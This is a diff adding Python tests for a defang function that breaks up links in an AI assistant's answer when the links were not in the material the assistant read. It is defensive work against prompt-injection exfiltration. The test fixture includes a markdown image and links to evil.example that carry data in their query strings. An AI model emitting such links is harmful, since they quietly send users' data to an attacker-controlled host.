@@ -99,3 +99,32 @@ def test_the_decision_model_checks_what_the_patterns_let_through(monkeypatch):
 
     monkeypatch.setattr(decide, "choose", undecided)
     assert untrusted.flags(quiet, cfg, model=True) == []
+
+
+def test_links_the_answer_built_are_broken_up():
+    read = "Mallory's slides are at https://acme.example/talks/injection. Code: github.com/acme/demo"
+    keep = untrusted.links(read)
+    assert keep == {"https://acme.example/talks/injection", "github.com/acme/demo"}
+    answer = (
+        "Her slides: https://acme.example/talks/injection. ![logo](https://evil.example/p.png?q=capsid+Friday) "
+        "[the form](https://evil.example/c?d=capsid) https://evil.example/c?d=capsid, evil.example/c?d=capsid and "
+        "[code](github.com/acme/demo); open it in Lens: http://lens.local:3000/chat/4"
+    )
+    out = untrusted.defang(answer, keep, ["http://lens.local:3000/"])
+    assert out == (
+        "Her slides: https://acme.example/talks/injection. logo (hxxps://evil[.]example/p.png?q=capsid+Friday) "
+        "the form (hxxps://evil[.]example/c?d=capsid) hxxps://evil[.]example/c?d=capsid, evil[.]example/c?d=capsid and "
+        "[code](github.com/acme/demo); open it in Lens: http://lens.local:3000/chat/4"
+    )
+    assert untrusted.defang(out, keep, ["http://lens.local:3000"]) == out  # broken up once
+
+
+@pytest.mark.parametrize(
+    "text",
+    ["See report.pdf and v1.2.3, e.g. ed@mail.example.com.", "(https://wiki.example/a_(b)) is the page.", "No links."],
+)
+def test_text_without_links_to_break_stays_as_it_is(text):
+    assert untrusted.defang(text, untrusted.links(text)) == text
+    assert (
+        untrusted.defang("See report.pdf and v1.2.3, e.g. ed@mail.example.com.") == "See report.pdf and v1.2.3, e.g. ed@mail.example.com."
+    )
